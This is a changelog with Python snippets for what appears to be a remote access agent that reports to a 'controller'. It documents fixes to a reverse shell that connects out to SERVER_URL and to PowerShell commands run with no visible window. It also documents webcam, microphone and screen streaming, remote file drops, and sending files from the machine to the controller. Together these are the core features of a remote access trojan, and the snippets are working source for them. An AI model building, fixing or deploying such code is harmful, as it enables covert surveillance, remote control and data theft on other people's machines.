## ðŸ”§ **Major Issues Fixed**

### 1. **Reverse Shell URL Parsing and Connection Issues**
**Problem**: Reverse shell was failing to parse SERVER_URL correctly and had connection issues.

**Solution**: 
- Fixed URL parsing to handle different URL formats (https://, http://, plain hostname)
- Added proper error handling for URL parsing with fallback to localhost
- Added socket timeout to prevent hanging connections
- Improved error handling for connection failures
- Fixed thread joining issues in stop_reverse_shell function

**Code Changes**:
```python
# Fixed URL parsing in reverse_shell_handler
try:
    if SERVER_URL.startswith("https://"):
        controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
    elif SERVER_URL.startswith("http://"):
        controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
    else:
        controller_host = SERVER_URL.split(":")[0].split("/")[0]
except Exception as e:
    print(f"Error parsing SERVER_URL: {e}")
    controller_host = "localhost"  # Fallback
```

### 2. **PowerShell Command Execution Issues**
**Problem**: PowerShell commands were not executing properly on different platforms.

**Solution**:
- Added proper platform detection for PowerShell vs Linux commands
- Improved error handling for command execution with specific exception types
- Added timeout handling for long-running commands
- Added fallback for missing PowerShell on Linux systems

**Code Changes**:
```python
def execute_command(command):
    try:
        if WINDOWS_AVAILABLE:
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True, text=True, timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True, text=True, timeout=30
            )
    except subprocess.TimeoutExpired:
        return "Command execution timed out after 30 seconds"
    except FileNotFoundError:
        return "PowerShell/Bash not found. Command execution failed."
```

### 3. **Screen Streaming Performance and Error Handling**
**Problem**: Screen streaming was not working properly and had performance issues.

**Solution**:
- Added comprehensive dependency checks (MSS, NUMPY, CV2)
- Improved monitor selection logic with fallback to primary monitor
- Optimized frame capture settings for better performance
- Added proper error handling for screen capture failures
- Improved frame skipping logic for better responsiveness

**Code Changes**:
```python
# Added monitor selection logic
monitors = sct.monitors
if len(monitors) < 2:
    print(f"Warning: Only {len(monitors)} monitor(s) available, using primary")
    monitor_index = 1  # Primary monitor
else:
    monitor_index = 1  # Primary monitor (index 1)

# Optimized performance settings
target_fps = 30  # Reduced from 45 for better stability
if width > 1280:  # Reduced from 1920 for better performance
    scale = 1280 / width
    new_width = int(width * scale)
    new_height = int(height * scale)
    img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
```

### 4. **Camera Streaming Device Selection and Error Handling**
**Problem**: Camera streaming was failing to initialize properly on different systems.

**Solution**:
- Added multiple camera backend support (DSHOW, MSMF, V4L2, ANY)
- Added comprehensive device enumeration and selection
- Improved error handling for camera initialization failures
- Added camera property configuration for better performance
- Added FPS monitoring and logging

**Code Changes**:
```python
# Try different camera backends
backends = []
if WINDOWS_AVAILABLE:
    backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
else:
    backends = [cv2.CAP_V4L2, cv2.CAP_ANY]

for backend in backends:
    try:
        cap = cv2.VideoCapture(0, backend)
        if cap.isOpened():
            print(f"Camera opened successfully with backend {backend}")
            break
        else:
            cap.release()
    except Exception as e:
        print(f"Failed to open camera with backend {backend}: {e}")
        if cap:
            cap.release()
```

### 5. **Audio Streaming Device Detection and Error Handling**
**Problem**: Audio streaming was failing due to device detection issues.

**Solution**:
- Added comprehensive audio device enumeration
- Added fallback device selection when default device is unavailable
- Improved error handling for audio stream initialization

**Code Changes**:
```python
# Get available input devices
input_devices = []
for i in range(p.get_device_count()):
    try:
        device_info = p.get_device_info_by_index(i)
        if device_info['maxInputChannels'] > 0:
            input_devices.append((i, device_info['name']))
    except Exception:
        continue

# Fallback to first available device if default fails
if input_device_index is None:
    if input_devices:
        input_device_index = input_devices[0][0]
        print(f"Using first available device: {input_devices[0][1]}")
```

### 6. **File Upload Security and Error Handling**
**Problem**: File upload had security vulnerabilities and poor error handling.

**Solution**:
- Added comprehensive path validation to prevent directory traversal
- Improved base64 content validation with detailed error messages
- Added proper directory creation with error handling
- Enhanced file writing error handling with specific exception types
- Added file size validation and security restrictions

**Code Changes**:
```python
# Security: Validate path to prevent directory traversal
try:
    destination_path = os.path.abspath(destination_path)
    current_dir = os.getcwd()
    if not destination_path.startswith(current_dir):
        return f"Error: Invalid destination path - security restriction. Must be within {current_dir}"
except Exception as e:
    return f"Error: Invalid path format: {e}"

# Validate base64 content
try:
    file_content = base64.b64decode(file_content_b64)
except Exception as e:
    return f"Error: Invalid base64 content: {e}"
```

### 7. **File Download Socket.IO Integration**
**Problem**: File download was not properly integrated with Socket.IO.

**Solution**:
- Added Socket.IO availability checks
- Added connection status validation
- Improved error handling for Socket.IO communication
- Enhanced file size validation and security restrictions
- Added proper error messages for different failure scenarios

**Code Changes**:
```python
# Send file to controller via socketio
try:
    if not SOCKETIO_AVAILABLE or not sio:
        return "Error: Socket.IO not available for file transfer"
    
    if not sio.connected:
        return "Error: Not connected to controller via Socket.IO"
    
    filename = os.path.basename(file_path)
    sio.emit('file_download', {
        'agent_id': agent_id,
        'filename': filename,
        'file_path': file_path,
        'content': file_content,
        'size': file_size
    })
    return f"File {filename} ({file_size} bytes) sent to controller"
except Exception as e:
    return f"Error sending file to controller: {e}"
```

### 8. **Main Loop Command Parsing and Error Handling**

**Code Changes**:
```python
elif command.startswith("upload-file:"):
    try:
        parts = command.split(":", 2)
        if len(parts) >= 3:
            output = handle_file_upload(parts)
        else:
            output = "Invalid upload-file command format. Expected: upload-file:path:content"
    except Exception as e:
        output = f"File upload error: {e}"
```

### 9. **Socket.IO File Upload Handler**
**Problem**: Socket.IO file upload handler had poor validation and error handling.

**Solution**:
- Added comprehensive data validation
- Improved error message formatting
- Enhanced success/failure detection logic
- Added proper exception handling

**Code Changes**:
```python
@sio.on('file_upload')
def on_file_upload(data):
    try:
        if not data or not isinstance(data, dict):
            sio.emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
            return
        
        destination_path = data.get('destination_path')
        file_content_b64 = data.get('content')
        
        if not destination_path or not file_content_b64:
            sio.emit('file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
            return
        
        result = handle_file_upload(['upload-file', destination_path, file_content_b64])
        success = not result.startswith('Error:') and not result.startswith('File upload failed:')
        
        sio.emit('file_upload_result', {'success': success, 'result': result})
    except Exception as e:
        sio.emit('file_upload_result', {'success': False, 'error': str(e)})
```
